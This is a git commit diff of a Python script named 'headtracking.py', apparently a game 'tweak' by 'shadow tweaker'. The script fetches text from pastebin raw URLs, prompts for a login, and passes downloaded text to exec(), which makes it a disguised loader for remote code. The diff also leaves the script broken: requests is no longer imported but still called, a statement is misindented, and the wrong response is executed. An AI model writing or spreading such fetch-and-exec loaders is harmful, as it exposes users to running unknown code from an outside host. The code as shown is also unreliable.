c793f14d513d3278780a3dd6f02c917100627542
saintzada <130616689+saintzada@users.noreply.github.com>
2023-09-18 10:08:58 -0700

    headtracking.py

--- headtracking.py
+++ headtracking.py
@@ -1,8 +1,5 @@
-import requests
 import json
 import time
-import platform
-
 # code by saintwq - shadow tweaker
 # shadow tweaker - 2023
 
@@ -12,9 +9,13 @@ def authenticate_user(username, password, auth_data):
     return False
 
 pastebin_login_url = "https://pastebin.com/raw/fArbGgkR"
+
+
 pastebin_code_url = "https://pastebin.com/raw/gF7tyWCf"
 
+
 response = requests.get(pastebin_login_url)
+
 
 if response.status_code == 200:
    
@@ -24,25 +25,28 @@ if response.status_code == 200:
         username = input("Digite seu nome de usuário: ")
         password = input("Digite sua senha: ")
 
+        
         if authenticate_user(username, password, auth_data):
             print("Login bem-sucedido!")
 
+         
+           
+
             # Verifique se a solicitação foi bem-sucedida
             if response.status_code == 200:
+                
                 python_code = response.text
 
-                # Use a função platform.platform() para obter informações sobre o dispositivo
-                device_info = platform.platform()
-                print(f"Modelo do dispositivo: {device_info}")
-
-            break
+                 break
+            else:
+                print("Não foi possível obter o código Python do Pastebin.")
         else:
             print("Login falhou. Por favor, verifique seu nome de usuário e senha.")
+
 
 try:
     exec(python_code)
 except Exception as e:
     print(f"Erro ao executar o código Python: {e}")
-
 # code by saintwq - shadow tweaker
 # shadow tweaker - 2023
